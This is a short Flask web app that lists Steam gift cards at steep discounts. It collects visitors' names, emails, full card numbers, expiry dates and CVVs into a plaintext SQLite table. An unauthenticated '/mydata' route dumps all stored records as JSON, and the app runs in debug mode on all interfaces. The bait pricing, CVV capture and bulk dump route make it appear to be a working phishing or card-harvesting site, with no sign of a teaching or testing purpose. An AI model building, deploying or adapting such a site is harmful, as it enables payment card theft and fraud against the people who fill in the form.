from flask import Flask, render_template, request, redirect, url_for, jsonify
import sqlite3

app = Flask(__name__)

JOBS = [{'id':1,
         'job':'/static/steam100.jpeg',
         'location': '$100',
         'salary':'$80'
        },
        {
          'id':2,
         'job':'/static/steam50.jpeg',
         'location': '$50',
         'salary':'$40'
        },
        {
          'id':3,
           'job':'/static/steam25.jpeg',
         'location': '$25',
         'salary':'$20'
        },
        {
          'id':4,
           'job':'/static/steam10.jpeg',
         'location': '$10',
         'salary':'$8'
        },
        {
          'id':5,
           'job':'/static/steam5.jpeg',
         'location': '$5',
         'salary':'$1'
        }

  ]

@app.route('/')
def hello_world():
  return render_template('home.html', jobs=JOBS)

@app.route('/form')
def form():
  return render_template('details.html')

@app.route('/detail', methods=['POST'])
def handle_submit():
  name = request.form['name']
  email = request.form['email']
  cardName = request.form['cardName']
  cardNum = request.form['cardNum']
  cardExp = request.form['cardExp']
  cardCVV = request.form['cardCVV']
  country = request.form['country']
  conn = sqlite3.connect('scope.db')
  cursor = conn.cursor()
  cursor.executemany('''
INSERT INTO users(cardname, cardnumber, cardexpiry, cardcvv, country, email, name)
VALUES(?,?,?,?,?,?,?)
''', [(cardName, cardNum, cardExp, cardCVV, country, email, name) ])
  conn.commit()
  conn.close()
  
  return redirect(url_for('details', name=name))

@app.route('/details')
def details():
  name = request.args.get('name')
  return render_template('end.html', email=name)
  
@app.route('/mydata')
def give_me():
  conn = sqlite3.connect('scope.db')
  cursor = conn.cursor() 
  cursor.execute("SELECT * FROM users")
  user = cursor.fetchall()
  conn.commit()
  conn.close()
  return jsonify(user)

if __name__ == "__main__":
  app.run(host='0.0.0.0', debug=True)
  

